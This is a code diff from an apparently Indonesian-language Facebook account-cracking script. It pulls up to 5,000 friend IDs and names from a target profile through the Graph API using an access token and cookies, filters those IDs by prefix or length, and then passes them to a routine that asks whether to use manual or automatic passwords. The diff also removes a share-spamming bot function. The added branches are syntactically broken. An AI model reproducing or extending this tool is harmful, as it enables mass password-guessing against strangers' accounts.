@@ -110,28 +110,26 @@ def dump_search(link):
 def publik(token,cookie):
 	idt = input(" [?] masukan id atau username : ")
 	try:
-			for i in ses.get(f"https://graph.facebook.com/v2.0/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
+			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
 				id.append(i["id"]+"<=>"+i["name"])
 		except KeyError:
 			exit(" [!] akun tidak tersedia atau list teman private")
-		
-def bot_share(token,cookie):
-	idt = input(" [?] masukan link : ")
-	limit = int(input(" [?] masukan limit : "))
-	try:
-		n = 0
-		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
-		for x in range(limit):
-			n+=1
-			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).text
-			data = json.loads(post)
-			if 'id' in post:
-				print(f" {n}. berhasil membagikan {data['id']}")
-			else:
-				exit(" [!] gagal membagikan, kemungkinan token invalid")
-	except:
-		exit(" [!] gagal membagikan, kemungkinan token invalid")
-		
+	elif ask in["2"]:
+		try:
+			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
+				if i["id"][:5] in ["10008"] or i["id"][:5] in ["10007"]:
+					id.append(i["id"]+"<=>"+i["name"])
+		except KeyError:
+			exit(" [!] akun tidak tersedia atau list teman private")
+	elif ask in["3"]:
+		try:
+			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
+				if len(i["id"])==7 or len(i["id"])==8 or len(i["id"])==9 or len(i["id"])==10:
+					id.append(i["id"]+"<=>"+i["name"])
+		except KeyError:
+			exit(" [!] akun tidak tersedia atau list teman private")
+atursandi()
+
 def atursandi():
 	print(f"\n\n [+] total id -> {len(id)}")
 	ask = input(" [?] mau gunakan sandi manual atau otomatis?[o/m] : ")
